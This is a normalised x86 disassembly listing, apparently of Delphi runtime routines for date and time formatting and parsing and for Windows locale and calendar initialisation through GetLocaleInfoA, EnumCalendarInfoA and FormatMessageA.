call sub_4096a8
pop ecx
cmp [ ebp - 0xc ] 0x1
jne r-xdata
push ebp
call sub_4096a8
pop ecx
push ebp
call sub_40970c
pop ecx
cmp [ ebp - 0xc ] 0x3
jle r-xdata
push ebp
call sub_40970c
pop ecx
mov esi [ ebp - 0x4 ]
dec esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_408484
test eax eax
jne r-xdata
push ebp
call sub_4096a8
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_4099bc
pop ecx
push ebp
call sub_40970c
pop ecx
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov al 0x4e
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov edx 0x4
call sub_40965c
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0xe ]
mov ecx 0x64
xor edx edx
div ecx
mov eax edx
mov edx 0x2
call sub_40965c
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_40965c
pop ecx
jmp r-xdata
je r-xdata
push ebp
call sub_4096d4
pop ecx
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x12 ]
mov edx [ ebp - 0xc ]
call sub_40965c
pop ecx
jmp r-xdata
je r-xdata
mov al [ esi ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
call sub_40965c
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1a ]
mov edx [ ebp - 0xc ]
call sub_40965c
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_4099bc
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_4099bc
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_40965c
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x3
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408484
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax r-xdata
mov edx 0x1
call sub_4095f8
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_4099bc
pop ecx
jmp r-xdata
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_4095f8
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax rw-data
mov edx 0x1
call sub_4095f8
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_40963c
pop ecx
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_4095bc
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_40963c
pop ecx
jmp r-xdata
dec eax
je r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov ax [ ebp - 0x16 ]
cmp [ ebp - 0x1e ] 0x0
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408484
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x2
mov eax esi
call sub_4095f8
pop ecx
add [ ebp - 0x4 ] 0x4
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x3
cmp [ ebp - 0x1a ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp - 0x4 ]
sub edx esi
mov eax esi
call sub_4095f8
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
je r-xdata
cmp al [ ebp - 0x5 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x10 ]
mov eax [ eax * 4 + rw-data ]
call sub_40963c
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_4095bc
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_40963c
pop ecx
jmp r-xdata
dec eax
je r-xdata
xor eax eax
mov al [ esi ]
cmp eax 0x48
jg r-xdata
mov eax esi
call sub_40be84
mov esi eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x2
jle r-xdata
test ax ax
jne r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408484
test eax eax
jne r-xdata
cmp [ ebp - 0x16 ] 0xc
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx 0x1
mov eax esi
call sub_4095f8
pop ecx
add [ ebp - 0x4 ] 0x2
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
add esi 0x2
inc [ ebp - 0x4 ]
jmp r-xdata
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_4099bc
pop ecx
jmp r-xdata
jmp r-xdata
sub eax 0x61
je r-xdata
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
movzx eax ax
mov edx [ ebp - 0xc ]
call sub_40965c
pop ecx
jmp r-xdata
mov [ ebp - 0xc ] 0x2
cmp ax 0xc
jbe r-xdata
mov ax 0xc
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408484
test eax eax
jne r-xdata
push ebp
call sub_4096d4
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_4095bc
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_40963c
pop ecx
add [ ebp - 0x4 ] 0x3
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40963c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_40963c
pop ecx
jmp r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_40be84
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ rw-data ]
call sub_4099bc
pop ecx
jmp r-xdata
cmp [ ebp - 0x1f ] 0x0
jne r-xdata
sub eax 0x7
je r-xdata
sub eax 0x22
je r-xdata
sub ax 0xc
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x5 ]
mov edx 0x1
call sub_4095f8
pop ecx
jmp r-xdata
push ebp
call sub_4096d4
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0xc ]
push [ eax + 0x8 ]
call sub_4095bc
movzx eax ax
mov eax [ eax * 4 + rw-data ]
call sub_40963c
pop ecx
add [ ebp - 0x4 ] 0x2
jmp r-xdata
add [ ebp - 0x4 ] 0x3
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
inc esi
mov edx r-xdata
mov ecx 0x5
mov eax esi
call sub_408484
test eax eax
je r-xdata
jmp r-xdata
mov al [ ebp - 0x1f ]
xor al 0x1
mov [ ebp - 0x1f ] al
sub eax 0x5
je r-xdata
mov [ ebp - 0x1e ] 0x1
jmp r-xdata
mov edx r-xdata
mov ecx 0x3
mov eax esi
call sub_408484
test eax eax
je r-xdata
sub eax 0x1a
je r-xdata
mov edx r-xdata
mov ecx 0x4
mov eax esi
call sub_408484
test eax eax
jne r-xdata
jmp r-xdata
sub_40a170
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
mov [ ebp - 0x108 ] eax
test ebx ebx
je r-xdata
push ebp
mov eax r-xdata
call sub_4099bc
pop ecx
push ebp
mov eax ebx
call sub_4099bc
pop ecx
jmp r-xdata
lea edx [ ebp - 0x100 ]
mov eax esi
mov ecx [ ebp - 0x104 ]
call sub_40405c
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_40a1e0
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov ebx [ edi ]
jmp r-xdata
mov eax esi
call sub_40422c
cmp ebx eax
jg r-xdata
mov [ edi ] ebx
pop edi
pop esi
pop ebx
retn
cmp [ esi + ebx - 0x1 ] 0x20
je r-xdata
inc ebx
sub_40a204
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_40a1e0
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
xor esi esi
jmp r-xdata
mov eax edi
call sub_40422c
cmp ebx eax
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp ebx [ eax ]
jle r-xdata
mov al [ edi + ebx - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
sub al dl
mov edx [ ebp + 0x8 ]
mov [ edx ] al
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax ] si
mov [ ebp - 0x9 ] 0x1
cmp si 0x3e8
jb r-xdata
mov eax esi
add eax eax
lea eax [ eax + eax * 4 ]
xor edx edx
mov dl [ edi + ebx - 0x1 ]
sub dx 0x30
add ax dx
mov esi eax
inc ebx
sub_40a298
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test edi edi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a318
lea eax [ ebp - 0x8 ]
call sub_403f6c
retn
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40a1e0
lea eax [ ebp - 0x8 ]
push eax
mov eax edi
call sub_40422c
mov ecx eax
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_40448c
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_407ba4
test eax eax
jne r-xdata
mov eax edi
call sub_40422c
add [ esi ] eax
mov bl 0x1
sub_40a324
push ebx
push esi
push edi
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
xor ebx ebx
mov edx edi
mov eax esi
call sub_40a1e0
mov eax esi
call sub_40422c
cmp eax [ edi ]
jl r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
mov al [ esi + eax - 0x1 ]
cmp al [ esp ]
jne r-xdata
inc [ edi ]
mov bl 0x1
sub_40a35c
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov edi 0x1
jmp r-xdata
mov eax esi
call sub_40422c
cmp edi eax
jle r-xdata
mov al [ esi + edi - 0x1 ]
and al 0xdf
sub al 0x44
je r-xdata
xor ebx ebx
mov bl 0x1
jmp r-xdata
dec al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov bl 0x2
jmp r-xdata
sub al 0x8
je r-xdata
xor ebx ebx
jmp r-xdata
sub al 0xc
je r-xdata
mov bl 0x2
jmp r-xdata
jmp r-xdata
inc edi
sub_40a3a8
push ebx
push esi
mov ebx edx
mov esi eax
jmp r-xdata
mov eax esi
call sub_40422c
cmp eax [ ebx ]
jl r-xdata
pop esi
pop ebx
retn
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
add al 0xd0
sub al 0xa
jae r-xdata
mov eax [ ebx ]
mov al [ esi + eax - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc [ ebx ]
mov edx [ ebx ]
mov eax esi
call sub_40bec8
mov [ ebx ] eax
jmp r-xdata
sub_40a3f0
push ebx
push esi
push edi
push ebp
push ecx
mov ebp eax
xor eax eax
mov [ esp ] eax
mov edi 0x7
mov ebx rw-data
mov esi rw-data
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_40442c
push eax
mov eax [ ebx ]
call sub_40442c
pop edx
call sub_40bfb4
test eax eax
je r-xdata
add esi 0x4
add ebx 0x4
dec edi
jne r-xdata
mov eax [ esi ]
mov [ esp ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
sub_40a444
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ rw-data ] 0x12
jne r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
cmp ebx 0x63
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jle r-xdata
call sub_4095e4
movzx ecx ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cdq
xor eax edx
sub eax edx
add ecx eax
mov eax ecx
mov ecx 0x64
cdq
idiv ecx
imul eax eax 0x64
add ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
neg [ eax - 0x4 ]
jmp r-xdata
sub_40a4a0
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
mov [ ebp - 0x12 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x9 ] 0x0
mov eax [ rw-data ]
call sub_40a35c
mov [ ebp - 0xa ] al
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ rw-data ]
mov eax r-xdata
call sub_40bf7c
test eax eax
jle r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x67
jne r-xdata
lea eax [ ebp - 0x15 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_40a204
test al al
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax esi
call sub_40a3a8
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx ]
dec ecx
mov edx 0x1
mov eax esi
call sub_40448c
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x1c ]
call sub_407c14
mov eax [ ebp - 0x1c ]
call sub_40a3f0
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40a7c2
lea eax [ ebp - 0x28 ]
mov edx 0x4
call sub_403f90
retn
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a324
test al al
je r-xdata
lea eax [ ebp - 0x16 ]
push eax
lea ecx [ ebp - 0xe ]
mov edx ebx
mov eax esi
call sub_40a204
test al al
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a324
test al al
je r-xdata
call sub_4095e4
mov edi eax
cmp [ ebp - 0xa ] 0x1
jne r-xdata
lea eax [ ebp - 0x17 ]
push eax
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
call sub_40a204
test al al
je r-xdata
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
jmp r-xdata
mov al [ ebp - 0xa ]
sub al 0x1
jb r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov cx [ ebp - 0x14 ]
mov dx [ ebp - 0x12 ]
mov eax edi
call sub_409388
mov [ ebp - 0x9 ] al
mov edx [ rw-data ]
mov eax r-xdata
call sub_404570
test eax eax
je r-xdata
mov edx ebx
mov cl [ rw-data ]
mov eax esi
call sub_40a324
mov edx ebx
mov eax esi
call sub_40a1e0
cmp [ rw-data ] 0x0
je r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xc ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xe ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
je r-xdata
mov eax [ rw-data ]
mov al [ eax ]
add al 0xd0
sub al 0xa
jae r-xdata
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov di [ ebp - 0x10 ]
mov al [ ebp - 0x17 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_40422c
cmp eax [ ebx ]
jl r-xdata
mov edx ebx
mov eax esi
call sub_40a3a8
jmp r-xdata
cmp [ ebp - 0x18 ] 0x2
ja r-xdata
push ebp
movzx eax di
call sub_40a444
pop ecx
mov edi eax
jmp r-xdata
mov di [ ebp - 0xc ]
mov al [ ebp - 0x15 ]
mov [ ebp - 0x18 ] al
mov ax [ ebp - 0xe ]
mov [ ebp - 0x12 ] ax
mov ax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] ax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40a1e0
mov eax esi
call sub_40422c
cmp eax [ ebx ]
jl r-xdata
mov eax [ ebx ]
cmp [ esi + eax - 0x1 ] 0x20
jne r-xdata
call sub_4095e4
movzx ecx ax
movzx eax [ rw-data ]
sub ecx eax
mov eax ecx
push ecx
mov ecx 0x64
cdq
idiv ecx
pop ecx
imul ax ax 0x64
add di ax
cmp [ rw-data ] 0x0
jbe r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov eax [ rw-data ]
call sub_40422c
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_40448c
mov edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_407ba4
test eax eax
je r-xdata
inc [ ebx ]
movzx eax di
cmp ecx eax
jle r-xdata
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
call sub_40422c
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_40448c
mov edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_407ba4
test eax eax
jne r-xdata
add di 0x64
jmp r-xdata
sub_40a7e4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov esi edx
mov ebp eax
xor ebx ebx
or edi 0xffffffff
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a298
test al al
jne r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a298
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a298
test al al
jne r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0x8 ]
mov edx esi
mov eax ebp
call sub_40a204
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40a1e0
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a298
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x6 ] 0x0
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xa ] 0x0
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a324
test al al
je r-xdata
test edi edi
jge r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xa ]
mov edx esi
mov eax ebp
call sub_40a204
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a298
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a324
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40a1e0
mov ax [ esp + 0xa ]
push eax
mov eax [ esp + 0x4 ]
push eax
mov cx [ esp + 0x10 ]
mov dx [ esp + 0xe ]
mov ax [ esp + 0xc ]
call sub_409280
mov ebx eax
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a298
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xc ]
mov edx esi
mov eax ebp
call sub_40a204
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
ja r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40a298
test al al
jne r-xdata
mov edx esi
mov cl [ rw-data ]
mov eax ebp
call sub_40a324
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
jne r-xdata
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40a298
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xe ]
mov edx esi
mov eax ebp
call sub_40a204
test al al
je r-xdata
add [ esp + 0x4 ] di
mov [ esp + 0x4 ] 0x0
sub_40a9d8
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
mov ecx esi
mov edx esp
mov eax ebx
call sub_40a7e4
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_40422c
cmp eax [ esp ]
jl r-xdata
pop edx
pop esi
pop ebx
retn
mov al 0x1
sub_40aa0c
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov esi eax
mov bl 0x1
mov [ esp ] 0x1
xor eax eax
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax esi
call sub_40a4a0
test al al
je r-xdata
mov edx edi
mov eax esi
call sub_40a9d8
mov ebx eax
jmp r-xdata
mov eax esi
call sub_40422c
cmp eax [ esp ]
jl r-xdata
mov eax ebx
add esp 0x18
pop edi
pop esi
pop ebx
retn
fld [ esp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
lea ecx [ esp + 0x10 ]
mov edx esp
mov eax esi
call sub_40a7e4
test al al
jne r-xdata
fld [ esp + 0x8 ]
fsub [ esp + 0x10 ]
fstp [ edi ]
fwait
fld [ esp + 0x8 ]
fadd [ esp + 0x10 ]
fstp [ edi ]
fwait
jmp r-xdata
sub_40aa98
push ebx
add esp 0xffffff00
mov ebx edx
push 0x0
push 0x100
lea edx [ esp + 0x8 ]
push edx
push 0x0
push eax
push 0x0
push 0x3200
call FormatMessageA
jmp r-xdata
test eax eax
jle r-xdata
mov edx esp
mov ecx ebx
xchg ecx eax
call sub_40405c
add esp 0x100
pop ebx
retn
mov dl [ esp + eax - 0x1 ]
sub dl 0x21
jb r-xdata
dec eax
sub dl 0xd
je r-xdata
sub_40aae4
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov esi ecx
mov ebx [ ebp + 0x8 ]
push 0x100
lea ecx [ ebp - 0x100 ]
push ecx
push edx
push eax
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov edx esi
call sub_403fc0
mov ecx eax
dec ecx
lea edx [ ebp - 0x100 ]
mov eax ebx
call sub_40405c
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_40ab30
push ebx
push esi
push edi
push ecx
mov ebx ecx
mov esi edx
mov edi eax
push 0x2
lea eax [ esp + 0x4 ]
push eax
push esi
push edi
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov al [ esp ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_40ab58
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push ebx
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx esi
call sub_40aae4
cmp [ ebx ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx ebx
call sub_405a6c
sub_40ab94
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
call GetThreadLocale
mov [ ebp - 0x4 ] eax
mov ebx 0x1
mov esi rw-data
mov edi rw-data
push ebp
push 0xb
lea eax [ ebp - 0xc ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x44 ]
dec eax
call sub_40ab58
pop ecx
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403fc0
push ebp
push 0xb
lea eax [ ebp - 0x10 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x38 ]
dec eax
call sub_40ab58
pop ecx
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_403fc0
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0xd
jne r-xdata
mov ebx 0x1
mov esi rw-data
mov edi rw-data
lea eax [ ebx + 0x5 ]
mov ecx 0x7
cdq
idiv ecx
mov [ ebp - 0x8 ] edx
push ebp
push 0x6
lea eax [ ebp - 0x14 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x31
call sub_40ab58
pop ecx
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_403fc0
push ebp
push 0x6
lea eax [ ebp - 0x18 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x2a
call sub_40ab58
pop ecx
mov edx [ ebp - 0x18 ]
mov eax edi
call sub_403fc0
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0x8
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40acae
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_403f90
retn
sub_40acb8
push ebp
mov ebp esp
push ebx
push esi
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0x0
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebx * 4 + rw-data ]
mov edx [ ebp + 0x8 ]
call sub_404164
mov esi 0x1
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
inc ebx
sub_40acf4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0xffffffff
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404164
mov eax [ ebp - 0x4 ]
xor edx edx
call sub_407e8c
mov [ ebx * 4 + rw-data ] eax
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ad60
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
inc ebx
sub_40ad6c
push ebp
mov ebp esp
push 0x0
push esi
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x100b
call sub_40aae4
mov eax [ ebp - 0x4 ]
mov edx 0x1
call sub_407e8c
mov esi eax
mov eax esi
add eax 0xfffffffd
sub eax 0x3
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ae0a
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
push 0x4
push esi
call GetThreadLocale
push eax
push sub_40acb8
call EnumCalendarInfoA
mov edx 0x7
mov eax rw-data
mov [ eax ] 0xffffffff
add eax 0x4
dec edx
jne r-xdata
push 0x3
push esi
call GetThreadLocale
push eax
push sub_40acf4
call EnumCalendarInfoA
sub_40ae1c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx 0x1
mov eax edi
call sub_403f6c
lea eax [ ebp - 0x8 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x1009
call sub_40aae4
mov eax [ ebp - 0x8 ]
mov edx 0x1
call sub_407e8c
add eax 0xfffffffd
sub eax 0x3
jb r-xdata
mov eax esi
call sub_40422c
cmp ebx eax
jle r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
mov al [ esi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
xor eax eax
pop edx
pop ecx
